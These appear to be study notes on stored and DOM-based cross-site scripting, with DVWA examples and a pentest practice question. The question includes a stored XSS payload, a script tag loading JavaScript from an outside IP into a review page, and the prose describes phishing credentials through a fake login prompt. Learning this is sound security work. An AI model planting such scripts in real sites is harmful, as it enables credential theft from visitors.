Stored, or persistent, XSS attacks occur when malicious code or script is permanently stored on a vulnerable or malicious server, using a database. These attacks are typically carried out on websites hosting blog posts (comment forms), web forums, and other permanent storage methods. An example of a stored XSS attack is a user requesting the stored information from the vulnerable or malicious server, which causes the injection of the requested malicious script into the victim’s browser. In this type of attack, the vulnerable server is usually a known or trusted site.

Figure 6-19 and Figure 6-20 illustrate a stored XSS attack. Figure 6-19 shows that a user has entered the string in the second form field in DVWA.

**_Figure 6-19_** _- A Stored XSS Attack in a Web Form_

![[Pasted image 20240616060501.png]]

After the user clicks the Sign Guestbook button, the dialog box shown in Figure 6-20 appears. The attack persists because even if the user navigates out of the page and returns to that same page, the dialog box continues to pop up.

**_Figure 6-20_** _- A Persistent (Stored) XSS Attack_

![[Pasted image 20240616060552.png]]

In this example, the dialog box message is “Omar was here!” However, in a real attack, an attacker might present users with text persuading them to perform a specific action, such as “your password has expired” or “please log in again.” The goal of the attacker would be to redirect the user to another site to steal his or her credentials when the user tries to change the password or once again log in to the fake application.

The Document Object Model (DOM) is a cross-platform and language-independent application programming interface that treats an HTML, XHTML, or XML document as a tree structure. DOM-based attacks are typically reflected XSS attacks that are triggered by sending a link with inputs that are reflected to the web browser. In DOM-based XSS attacks, the payload is never sent to the server. Instead, the payload is only processed by the web client (browser).

In a DOM-based XSS attack, the attacker sends a malicious URL to the victim, and after the victim clicks on the link, the attacker may load a malicious website or a site that has a vulnerable DOM route handler. After the vulnerable site is rendered by the browser, the payload executes the attack in the user’s context on that site.

One of the effects of any type of XSS attack is that the victim typically does not realize that an attack has taken place.

**TIP** DOM-based applications use global variables to manage client-side information. Often developers create unsecured applications that put sensitive information in the DOM (for example, tokens, public profile URLs, private URLs for information access, cross-domain OAuth values, and even user credentials as variables). It is a best practice to avoid storing any sensitive information in the DOM when building web applications.

---

Practice - Stored XSS Attacks

**Q.** As part of the Pixel Paradise pentest, you have visited their product review site and successfully posted the following message:

_Warlocks of Wonder is the greatest game of its type ever made!  
<script src=”https://203.0.113.17/protego_test.js”> </script>_

The script creates logfile entries on a Protego server every time a visitor to the reviews page triggers the script. You immediately start to see entries in the log. What exploit have you created on the Pixel Paradise web site?

**A.** Stored cross-site scripting attack (XSS) attacks occur when malicious code or scripts are permanently stored on a vulnerable or malicious server using a database. These attacks are typically carried out on websites hosting blog posts, web forums, and other permanent storage methods.

